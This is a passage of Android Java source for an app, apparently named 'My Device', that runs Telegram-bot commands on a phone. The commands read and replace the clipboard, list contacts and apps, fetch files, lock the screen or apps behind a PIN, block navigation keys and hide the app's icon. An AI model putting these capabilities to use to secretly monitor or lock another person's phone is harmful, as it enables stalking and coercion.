        int totalPages = Math.max(1, (all.size() + PER - 1) / PER);
        page = Math.max(0, Math.min(page, totalPages - 1));
        StringBuilder sb = new StringBuilder("\uD83D\uDC65 Kontak [").append(target)
                .append("] \u2014 hal ").append(page + 1).append('/').append(totalPages)
                .append(" (").append(all.size()).append("):\n");
        for (int i = page * PER; i < Math.min(all.size(), (page + 1) * PER); i++) {
            sb.append("\u2022 ").append(all.get(i)[0]).append(": ").append(all.get(i)[1]).append("\n");
        }
        java.util.List<String[]> nav = new java.util.ArrayList<>();
        if (page > 0) nav.add(new String[]{"\u23EE\uFE0F Sebelumnya", "kontakpg:" + (page - 1)});
        if (page < totalPages - 1) nav.add(new String[]{"Lanjut \u23ED\uFE0F", "kontakpg:" + (page + 1)});
        JSONObject kb = nav.isEmpty() ? null
                : buildMenuKb(ctx, target, nav.toArray(new String[0][]), null, 2);
        String teks = sb.toString();
        try {
            if (msgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, msgId, teks, kb);
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, kb);
        } catch (Exception ignored) {
        }
    }

    private static void doClipboard(Context ctx, long chatId, String target, String arg) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (!arg.isEmpty()) {
                doClipSet(ctx, chatId, target, arg);
                return;
            }
            CharSequence t = cm.hasPrimaryClip()
                    ? cm.getPrimaryClip().getItemAt(0).coerceToText(ctx) : null;
            String cur = t == null ? "(kosong)" : t.toString();
            if (cur.length() > 800) cur = cur.substring(0, 800) + "...";
            PollService.pending.put(chatId, target + ":clipboard");
            replyT(ctx, chatId, target, "\uD83D\uDCCB Isi clipboard [" + target + "]:\n" + cur
                    + "\n\nKirim teks untuk MENGGANTI isinya, atau abaikan.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doVolume(Context ctx, long chatId, String target, String arg) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (!arg.trim().isEmpty()) {
                int v = Integer.parseInt(arg.trim());
                am.setStreamVolume(AudioManager.STREAM_MUSIC, v, 0);
                replyT(ctx, chatId, target, "Volume media diset ke " + v + ".");
                return;
            }
            replyT(ctx, chatId, target, "Volume media: " + am.getStreamVolume(AudioManager.STREAM_MUSIC)
                    + "/" + am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                    + "\nKirim /volume <angka> untuk ubah.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doCerah(Context ctx, long chatId, String target, String arg) {
        try {
            if (!Settings.System.canWrite(ctx)) {
                replyT(ctx, chatId, target, "Butuh izin 'Ubah pengaturan sistem'.\nBuka aplikasi My Device > tombol izin.");
                return;
            }
            if (!arg.trim().isEmpty()) {
                int v = Math.max(1, Math.min(255, Integer.parseInt(arg.trim())));
                Settings.System.putInt(ctx.getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                Settings.System.putInt(ctx.getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS, v);
                replyT(ctx, chatId, target, "Kecerahan diset ke " + v + ".");
                return;
            }
            int cur = Settings.System.getInt(ctx.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, -1);
            replyT(ctx, chatId, target, "Kecerahan: " + cur + " (0-255)\nKirim /cerah <angka> untuk ubah.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doNotif(final Context ctx, final long chatId, String target, String teks) {
        String judul, isi;
        if (teks.contains("|")) {
            String[] p = teks.split("\\|", 2);
            judul = p[0].trim();
            isi = p[1].trim();
        } else {
            judul = "Pesan";
            isi = teks;
        }
        try {
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            String ch = "mydevice_cmd";
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel(ch, "My Device", NotificationManager.IMPORTANCE_HIGH));
            }
            android.app.Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new android.app.Notification.Builder(ctx, ch)
                    : new android.app.Notification.Builder(ctx);
            b.setContentTitle(judul).setContentText(isi)
                    .setSmallIcon(android.R.drawable.ic_dialog_info);
            nm.notify(2001, b.build());
            replyT(ctx, chatId, target, "Notifikasi dikirim.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doToast(final Context ctx, final long chatId, String target, final String teks) {
        runOnMain(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(ctx, teks, Toast.LENGTH_LONG).show();
            }
        });
        replyT(ctx, chatId, target, "Pesan ditampilkan di layar HP.");
    }

    private static void doDownload(final Context ctx, final long chatId, String target, String url) {
        replyT(ctx, chatId, target, "Mengunduh...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String u = url.trim();
                    if (!u.startsWith("http")) throw new Exception("Link harus diawali http(s)://");
                    String fname = u.split("\\?")[0];
                    fname = fname.substring(fname.lastIndexOf('/') + 1);
                    if (fname.isEmpty()) fname = "file_" + System.currentTimeMillis();
                    if (fname.length() > 80) fname = fname.substring(0, 80);
                    File dest = new File(ctx.getExternalFilesDir(null), fname);
                    HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
                    c.setRequestProperty("User-Agent", "Mozilla/5.0");
                    c.setConnectTimeout(60000);
                    c.setReadTimeout(90000);
                    long total = 0;
                    try (InputStream in = c.getInputStream();
                         FileOutputStream fos = new FileOutputStream(dest)) {
                        byte[] buf = new byte[8192];
                        int n;
                        while ((n = in.read(buf)) > 0) {
                            total += n;
                            if (total > 45L * 1024 * 1024) throw new Exception("File > 45MB");
                            fos.write(buf, 0, n);
                        }
                    }
                    TelegramApi.sendFile(Prefs.token(ctx), "sendDocument", "document",
                            chatId, dest, fname, deviceMenuMarkup(ctx, target));
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal unduh: " + e.getMessage());
                }
            }
        }).start();
    }

    private static void doWifi(Context ctx, long chatId, String target) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            String ssid = wi.getSSID() != null ? wi.getSSID().replace("\"", "") : "?";
            int ip = wi.getIpAddress();
            String ips = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
            replyT(ctx, chatId, target, "Wifi: " + ssid + "\nIP: " + ips
                    + "\nKecepatan: " + wi.getLinkSpeed() + " Mbps");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca wifi: " + e.getMessage());
        }
    }

    @SuppressWarnings("deprecation")
    private static void doWifiToggle(Context ctx, long chatId, String target, boolean on) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            boolean ok = wm.setWifiEnabled(on);
            String msg = ok ? (on ? "Wifi dinyalakan." : "Wifi dimatikan.")
                    : "Gagal (Android 10+ membatasi, ubah manual di Pengaturan).";
            if (ok && !on) {
                msg += "\n\u26A0\uFE0F Kalau internet HP ini lewat wifi, bot akan TERPUTUS!";
            }
            replyT(ctx, chatId, target, msg);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doPenyimpanan(Context ctx, long chatId, String target) {
        try {
            StatFs sf = new StatFs(ctx.getFilesDir().getPath());
            long block = sf.getBlockSizeLong();
            double total = sf.getBlockCountLong() * block / 1e9;
            double free = sf.getAvailableBlocksLong() * block / 1e9;
            replyT(ctx, chatId, target, String.format(Locale.US,
                    "Penyimpanan:\nTerpakai: %.1f GB\nBebas: %.1f GB\nTotal: %.1f GB",
                    total - free, free, total));
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    // ---------- kunci ----------

    private static void doKunci(Context ctx, long chatId, String target) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, DeviceAdmin.class);
            if (!dpm.isAdminActive(admin)) {
                replyT(ctx, chatId, target, "Device Admin belum aktif.\nBuka aplikasi My Device di HP itu > Aktifkan Device Admin.");
                return;
            }
            dpm.lockNow();
            replyT(ctx, chatId, target, "Layar dikunci.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal mengunci: " + e.getMessage());
        }
    }

    private static void doLockscreen(Context ctx, long chatId, String target, String arg) {
        String pin, pesan;
        if (arg.contains("|")) {
            String[] p = arg.split("\\|", 2);
            pin = p[0].trim();
            pesan = p[1].trim();
        } else {
            pin = arg.trim().split(" ")[0];
            pesan = "";
        }
        if (pin.isEmpty()) pin = Prefs.pin(ctx);
        if (pin.isEmpty()) {
            replyT(ctx, chatId, target, "Kirim /lockscreen <pin> | <pesan>, contoh:\n/lockscreen 1234 | HP ini dikunci, hubungi saya");
            return;
        }
        Prefs.setPin(ctx, pin);
        Prefs.setScreenLocked(ctx, true);
        if (!pesan.isEmpty()) Prefs.setLockMessage(ctx, pesan);
        Intent i = new Intent(ctx, LockActivity.class);
        i.putExtra("mode", "lockscreen");
        i.putExtra("pin", pin);
        i.putExtra("message", pesan.isEmpty() ? Prefs.lockMessage(ctx) : pesan);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        try {
            ctx.startActivity(i);
            replyT(ctx, chatId, target, "Lockscreen PIN dipasang di HP itu.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doBuka(Context ctx, long chatId, String target) {
        Prefs.setScreenLocked(ctx, false);
        Prefs.setPinLocked(ctx, false);
        LockActivity.remoteUnlock();
        AppLockService.tempUnlock.clear();
        replyT(ctx, chatId, target, "Kunci dibuka dari jarak jauh.");
    }

    private static void doDaftarApk(Context ctx, long chatId, String target) {
        try {
            PackageManager pm = ctx.getPackageManager();
            java.util.Map<String, String> map = new java.util.LinkedHashMap<>();
            // 1) aplikasi yang ada di launcher (seperti di beranda)
            try {
                android.content.Intent it = new android.content.Intent(
                        android.content.Intent.ACTION_MAIN, null);
                it.addCategory(android.content.Intent.CATEGORY_LAUNCHER);
                for (android.content.pm.ResolveInfo ri
                        : pm.queryIntentActivities(it, 0)) {
                    try {
                        String pkg = ri.activityInfo.packageName;
                        if (pkg.equals(ctx.getPackageName())) continue;
                        CharSequence lb = ri.loadLabel(pm);
                        map.put(pkg, lb == null ? pkg : lb.toString());
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception ignored) {
            }
            // 2) aplikasi non-system lain yang tidak punya ikon launcher
            try {
                for (android.content.pm.ApplicationInfo ai
                        : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
                    String pkg = ai.packageName;
                    if (pkg.equals(ctx.getPackageName()) || map.containsKey(pkg)) continue;
                    if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    try {
                        map.put(pkg, String.valueOf(pm.getApplicationLabel(ai)));
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception ignored) {
            }
            java.util.List<String> pkgs = new java.util.ArrayList<>(map.keySet());
            java.util.Collections.sort(pkgs, new java.util.Comparator<String>() {
                @Override
                public int compare(String a, String b) {
                    return map.get(a).compareToIgnoreCase(map.get(b));
                }
            });
            JSONArray arr = new JSONArray();
            java.util.Set<String> locked = Prefs.lockedApps(ctx);
            StringBuilder sb = new StringBuilder();
            int n = 0;
            for (String pkg : pkgs) {
                n++;
                arr.put(map.get(pkg) + "|" + pkg);
                sb.append(n).append(". ").append(map.get(pkg));
                if (locked.contains(pkg)) sb.append(" \uD83D\uDD12");
                sb.append("\n");
                if (sb.length() > 2800) {
                    sb.insert(0, "\uD83D\uDCF2 Aplikasi [" + target + "]:\n");
                    TelegramApi.sendMessage(Prefs.token(ctx), chatId, sb.toString(),
                            afterMarkup(target));
                    sb = new StringBuilder("...lanjutan...\n");
                }
            }
            Prefs.setLastAppList(ctx, arr);
            sb.insert(0, "\uD83D\uDCF2 Aplikasi [" + target + "] (" + n + "):\n");
            replyT(ctx, chatId, target, sb.toString());
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doLockApk(Context ctx, long chatId, String target, String arg, boolean lock) {
        JSONObject app = Prefs.resolveApp(ctx, arg);
        if (app == null) app = findAppLive(ctx, arg);
        if (app == null) {
            replyT(ctx, chatId, target, "Aplikasi tidak ditemukan. Lihat /daftarapk dulu.");
            return;
        }
        try {
            String pkg = app.getString("pkg");
            String label = app.getString("label");
            Set<String> locked = new HashSet<>(Prefs.lockedApps(ctx));
            if (lock) {
                locked.add(pkg);
                replyT(ctx, chatId, target, "\uD83D\uDD12 " + label + " DIKUNCI.\nTidak bisa dibuka sama sekali kecuali via /bukapk dari sini.\n(Pastikan Aksesibilitas My Device aktif di HP itu)");
            } else {
                // buka SEMENTARA: tetap di daftar kunci, terkunci lagi setelah keluar aplikasi
                AppLockService.tempUnlock.put(pkg, System.currentTimeMillis() + 30L * 60 * 1000);
                LockActivity.remoteUnlock();
                replyT(ctx, chatId, target, "\u2705 " + label + " dibuka SEMENTARA (30 menit).\nAplikasi terkunci lagi otomatis setelah kamu keluar dari aplikasi itu.");
            }
            Prefs.setLockedApps(ctx, locked);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    /** Buka/jalankan aplikasi yang dipilih. */
    /** Cari aplikasi langsung (tanpa /daftarapk dulu): cocokkan nama label/paket. */
    private static JSONObject findAppLive(Context ctx, String query) {
        try {
            String q = query.trim().toLowerCase();
            if (q.isEmpty()) return null;
            PackageManager pm = ctx.getPackageManager();
            try {
                android.content.Intent it = new android.content.Intent(
                        android.content.Intent.ACTION_MAIN, null);
                it.addCategory(android.content.Intent.CATEGORY_LAUNCHER);
                for (android.content.pm.ResolveInfo ri : pm.queryIntentActivities(it, 0)) {
                    String pkg = ri.activityInfo.packageName;
                    if (pkg.equals(ctx.getPackageName())) continue;
                    String label = String.valueOf(ri.loadLabel(pm));
                    String pl = pkg.toLowerCase(), ll = label.toLowerCase();
                    if (ll.contains(q) || pl.contains(q) || pl.endsWith("." + q)) {
                        JSONObject o = new JSONObject();
                        o.put("label", label);
                        o.put("pkg", pkg);
                        return o;
                    }
                }
            } catch (Exception ignored) {
            }
            for (android.content.pm.ApplicationInfo ai
                    : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
                if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                String pkg = ai.packageName;
                if (pkg.equals(ctx.getPackageName())) continue;
                String label = String.valueOf(pm.getApplicationLabel(ai));
                String pl = pkg.toLowerCase(), ll = label.toLowerCase();
                if (ll.contains(q) || pl.contains(q) || pl.endsWith("." + q)) {
                    JSONObject o = new JSONObject();
                    o.put("label", label);
                    o.put("pkg", pkg);
                    return o;
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static void doBukaApk(Context ctx, long chatId, String target, String query) {
        JSONObject app = Prefs.resolveApp(ctx, query);
        if (app == null) app = findAppLive(ctx, query);
        if (app == null) {
            replyT(ctx, chatId, target, "Aplikasi tidak ditemukan. Lihat /daftarapk dulu.");
            return;
        }
        try {
            String pkg = app.getString("pkg");
            String label = app.getString("label");
            if (AppLockService.launchPackage(pkg)) {
                replyT(ctx, chatId, target, "\uD83D\uDCC2 Membuka " + label + "...");
            } else {
                replyT(ctx, chatId, target, "Gagal membuka " + label + " (diblokir Android).");
            }
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    public static void handleIncomingPhoto(final Context ctx, final long chatId, String target, String fileId) {
        replyT(ctx, chatId, target, "Mengambil foto...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String token = Prefs.token(ctx);
                    JSONObject f = TelegramApi.getFile(token, fileId);
                    String path = f.getJSONObject("result").getString("file_path");
                    File dest = new File(ctx.getExternalFilesDir(null),
                            "wallpaper_" + System.currentTimeMillis() + ".jpg");
                    TelegramApi.downloadFile(token, path, dest);
                    android.app.WallpaperManager wm =
                            android.app.WallpaperManager.getInstance(ctx);
                    try (InputStream in = new java.io.FileInputStream(dest)) {
                        wm.setStream(in);
                    }
                    replyT(ctx, chatId, target, "Wallpaper HP diganti dari foto yang kamu kirim.");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal ganti wallpaper: " + e.getMessage());
                }
            }
        }).start();
    }

    // ---------- pengatur level (volume & kecerahan) ----------

    /** Keyboard preset 0/25/50/75/100 + tombol kembali. */
    static JSONObject levelMarkup(String target, String action, int cur) {
        try {
            JSONArray kb = new JSONArray();
            int[] vals = {0, 25, 50, 75, 100};
            JSONArray row = new JSONArray();
            for (int i = 0; i < vals.length; i++) {
                if (i == 3) {
                    kb.put(row);
                    row = new JSONArray();
                }
                JSONObject b = new JSONObject();
                b.put("text", (vals[i] == cur ? "\u25CF " : "") + vals[i]);
                b.put("callback_data", "cmd:" + target + ":" + action + ":" + vals[i]);
                row.put(b);
            }
            kb.put(row);
            JSONArray row2 = new JSONArray();
            JSONObject back = new JSONObject();
            back.put("text", "\uD83D\uDD19 Kembali");
            back.put("callback_data", "cmd:" + target + ":menu");
            row2.put(back);
            kb.put(row2);
            JSONObject m = new JSONObject();
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    static int curVolumePct(Context ctx) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            if (max <= 0) return 50;
            return Math.round(am.getStreamVolume(AudioManager.STREAM_MUSIC) * 100f / max);
        } catch (Exception e) {
            return 50;
        }
    }

    static int curCerahPct(Context ctx) {
        try {
            int cur = Settings.System.getInt(ctx.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS, 128);
            return Math.round(cur * 100f / 255f);
        } catch (Exception e) {
            return 50;
        }
    }

    private static void showVolMenu(Context ctx, long chatId, String target, int cur, boolean edit) {
        String teks = "\uD83D\uDD0A Volume [" + target + "]: " + cur + "\nKetuk angka untuk atur:";
        try {
            if (edit && lastMsgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, lastMsgId, teks,
                            levelMarkup(target, "volset", cur));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, levelMarkup(target, "volset", cur));
        } catch (Exception ignored) {
        }
    }

    private static void doVolSet(Context ctx, long chatId, String target, String val) {
        try {
            int v = Math.max(0, Math.min(100, Integer.parseInt(val.trim())));
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, Math.round(max * v / 100f), 0);
            showVolMenu(ctx, chatId, target, v, true);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void showCerahMenu(Context ctx, long chatId, String target, int cur, boolean edit) {
        String teks = "\u2600 Kecerahan [" + target + "]: " + cur + "\nKetuk angka untuk atur:";
        try {
            if (edit && lastMsgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, lastMsgId, teks,
                            levelMarkup(target, "cerahset", cur));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, levelMarkup(target, "cerahset", cur));
        } catch (Exception ignored) {
        }
    }

    private static void doCerahSet(Context ctx, long chatId, String target, String val) {
        try {
            if (!Settings.System.canWrite(ctx)) {
                replyT(ctx, chatId, target, "Butuh izin 'Ubah pengaturan sistem'.\nBuka aplikasi My Device > Aktifkan > Izin aplikasi.");
                return;
            }
            int v = Math.max(0, Math.min(100, Integer.parseInt(val.trim())));
            int sys = Math.max(1, Math.round(v * 255f / 100f));
            Settings.System.putInt(ctx.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS_MODE,
                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
            Settings.System.putInt(ctx.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, sys);
            showCerahMenu(ctx, chatId, target, v, true);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    // ---------- perintah baru v2.0 ----------

    private static void doSenterToggle(Context ctx, long chatId, String target, String arg) {
        if (arg == null || arg.isEmpty()) {
            boolean on = !TorchHelper.get(ctx).isTorchOn();
            boolean ok = TorchHelper.get(ctx).setTorch(on);
            if (ok) {
                replyT(ctx, chatId, target, on ? "\uD83D\uDD26 Senter nyala." : "\uD83D\uDD26 Senter mati.");
            } else {
                replyT(ctx, chatId, target, "\uD83D\uDD26 Gagal menyalakan senter — kamera sedang dipakai aplikasi lain atau HP ini tidak punya flash.");
            }
        } else {
            doSenter(ctx, chatId, target, !"off".equalsIgnoreCase(arg));
        }
    }

    private static void doStrobo(Context ctx, long chatId, String target) {
        try {
            TorchHelper.get(ctx).startStrobe();
            replyT(ctx, chatId, target, "\u2728 Strobo AKTIF di [" + target + "].\nKirim /berhenti untuk mematikan.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doBerhenti(Context ctx, long chatId, String target) {
        berhentiTotal(ctx);
        exitSpeakMode(chatId);
        dengarOn.remove(chatId);
        stopTubeIfPlaying(ctx, chatId);
        replyT(ctx, chatId, target, "\u23F9 Semua dihentikan (ucapan/strobo/alarm).");
    }

    /**
     * Revisi 2026-10-13: hentikan SEMUA aktivitas di level perangkat
     * (dipakai /berhenti Telegram dan /berhenti via SMS).
     */
    public static void berhentiTotal(Context ctx) {
        try {
            HilangMode.stop(ctx);
        } catch (Exception ignored) {
        }
        try {
            TorchHelper.get(ctx).stopStrobe();
        } catch (Exception ignored) {
        }
        stopFindMy();
        speakMode.clear();
        dengarOn.clear();
        stopMediaLock(ctx);
        stopLokasiRt(ctx);
        antreanBatal();
        try {
            PapanActivity.stopCurrent();
        } catch (Exception ignored) {
        }
        try {
            Prefs.setPapanActive(ctx, false);
        } catch (Exception ignored) {
        }
        Prefs.setHilangTarget(ctx, null);
        try {
            if (voicePlayer != null) {
                try { voicePlayer.stop(); } catch (Exception ignored) {}
                try { voicePlayer.release(); } catch (Exception ignored) {}
                voicePlayer = null;
            }
        } catch (Exception ignored) {
        }
        try {
            for (Long cid : new java.util.ArrayList<>(tubeState.keySet())) {
                stopTubeIfPlaying(ctx, cid);
            }
        } catch (Exception ignored) {
        }
        try {
            TtsHelper.stopLoop();
        } catch (Exception ignored) {
        }
        try {
            AlarmReceiver.stop();
        } catch (Exception ignored) {
        }
        try {
            AlarmReceiver.dismissNotif(ctx);
        } catch (Exception ignored) {
        }
    }

    private static void doPesan(final Context ctx, final long chatId, String target, String teks) {
        final String msg = teks;
        runOnMain(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent i = new Intent(ctx, ChatActivity.class);
                    i.putExtra("text", msg);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                } catch (Exception ignored) {
                }
            }
        });
        replyT(ctx, chatId, target, "\uD83D\uDCAC Pesan ditampilkan di HP [" + target + "].");
    }

    private static void doClipSet(Context ctx, long chatId, String target, String teks) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("mydevice", teks));
            replyT(ctx, chatId, target, "Clipboard HP [" + target + "] diisi.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static android.media.MediaPlayer findPlayer = null;

    private static void doFindMy(final Context ctx, final long chatId, String target) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            stopFindMy();
            findPlayer = new android.media.MediaPlayer();
            findPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            findPlayer.setDataSource(ctx, Settings.System.DEFAULT_ALARM_ALERT_URI);
            findPlayer.setLooping(true);
            findPlayer.prepare();
            findPlayer.start();
            TorchHelper.get(ctx).startStrobe();
            AlarmLock.on(ctx);
            replyT(ctx, chatId, target, "\uD83D\uDCE2 Mode CARI HP aktif di [" + target + "]!\n\uD83D\uDD12 Volume dikunci maksimal & taskbar diblokir.\nKirim /berhenti untuk mematikan.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    static void stopFindMy() {
        try {
            if (findPlayer != null) {
                try { findPlayer.stop(); } catch (Exception ignored) { }
                try { findPlayer.release(); } catch (Exception ignored) { }
                findPlayer = null;
            }
        } catch (Exception ignored) {
        }
    }

    @SuppressWarnings({"MissingPermission"})
    private static void doBt(Context ctx, long chatId, String target, String arg) {
        try {
            android.bluetooth.BluetoothAdapter ba =
                    android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (ba == null) {
                replyT(ctx, chatId, target, "HP ini tidak punya Bluetooth.");
                return;
            }
            if (android.os.Build.VERSION.SDK_INT >= 31 && ctx.checkSelfPermission(
                    "android.permission.BLUETOOTH_CONNECT") != PackageManager.PERMISSION_GRANTED) {
                replyT(ctx, chatId, target, "Izin Bluetooth belum diberikan.\nBuka aplikasi My Device > Aktifkan > Izin aplikasi.");
                return;
            }
            if ("on".equalsIgnoreCase(arg) || "off".equalsIgnoreCase(arg)) {
                boolean want = "on".equalsIgnoreCase(arg);
                boolean reqOk = true;
                try {
                    reqOk = want ? ba.enable() : ba.disable();
                } catch (SecurityException se) {
                    reqOk = false;
                }
                boolean reached = false;
                if (reqOk) {
                    long t0 = android.os.SystemClock.uptimeMillis();
                    while (android.os.SystemClock.uptimeMillis() - t0 < 6000) {
                        int stt = ba.getState();
                        if ((want && stt == android.bluetooth.BluetoothAdapter.STATE_ON)
                                || (!want && stt == android.bluetooth.BluetoothAdapter.STATE_OFF)) {
                            reached = true;
                            break;
                        }
                        try {
                            Thread.sleep(400);
                        } catch (InterruptedException ignored) {
                        }
                    }
                    if (!reached) reached = (ba.isEnabled() == want);
                }
                if (!reached) {
                    // fallback: toggle lewat halaman Pengaturan via aksesibilitas
                    try {
                        reached = AppLockService.btViaSettings(want);
                    } catch (Exception ignored) {
                    }
                }
                if (reached) {
                    replyT(ctx, chatId, target, "Bluetooth " + (want ? "DINYALAKAN." : "DIMATIKAN."));
                    if (want) BtHelper.scan(ctx, chatId, target);
                } else if (want && AppLockService.launchSelf()) {
                    replyT(ctx, chatId, target, "Android memblokir menyalakan Bluetooth jarak jauh.\nMembuka aplikasi di HP [" + target + "] \u2014 ketuk IZINKAN pada dialog Bluetooth yang muncul di HP itu.");
                } else {
                    replyT(ctx, chatId, target, "Gagal mengubah Bluetooth \u2014 Android di HP ini memblokir toggle jarak jauh.\n" + (want ? "Nyalakan manual: tarik taskbar > ikon Bluetooth." : "Matikan manual: tarik taskbar > ikon Bluetooth."));
                }
            } else {
                try {
                    String[][] bti = ba.isEnabled()
                            ? new String[][]{{"\uD83D\uDD0D Pindai perangkat", "btscan"}}
                            : new String[0][0];
                    JSONObject kb = bti.length == 0 ? null
                            : buildMenuKb(ctx, target, bti, null, 1);
                    TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                            "Bluetooth: " + (ba.isEnabled() ? "NYALA" : "MATI")
                                    + "\nKirim /bton atau /btoff.", kb);
                } catch (Exception ignored) {
                    replyT(ctx, chatId, target, "Bluetooth: " + (ba.isEnabled() ? "NYALA" : "MATI"));
                }
            }
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doKunciPin(final Context ctx, final long chatId, String target, String pin) {
        pin = pin.trim().split(" ")[0];
        if (!pin.matches("[0-9]{4,8}")) {
            replyT(ctx, chatId, target, "PIN harus angka 4-8 digit. Contoh: /kuncipin 1234");
            return;
        }
        Prefs.setPinLockPin(ctx, pin);
        Prefs.setPinLocked(ctx, true);
        runOnMain(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent i = new Intent(ctx, LockActivity.class);
                    i.putExtra("mode", "pinlock");
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    ctx.startActivity(i);
                } catch (Exception ignored) {
                }
            }
        });
        String per = "🔑 HP [" + target + "] DIKUNCI dengan PIN.\n"
                + "Tombol home/back/recent/volume tidak berfungsi sampai PIN dimasukkan.\n"
                + "Kirim /buka untuk membuka dari jarak jauh.";
        if (!BarBlocker.canDrawOverlays(ctx)) {
            per += "\n⚠️ Izin \"Tampil di atas aplikasi lain\" belum aktif di HP itu — taskbar masih bisa ditarik. Aktifkan di aplikasi > Izin.";
        }
        replyT(ctx, chatId, target, per);
    }

    private static void doSembunyi(Context ctx, long chatId, String target) {
        AppIcon.setVisible(ctx, false);
        // verifikasi ulang setelah jeda (launcher kadang lambat refresh)
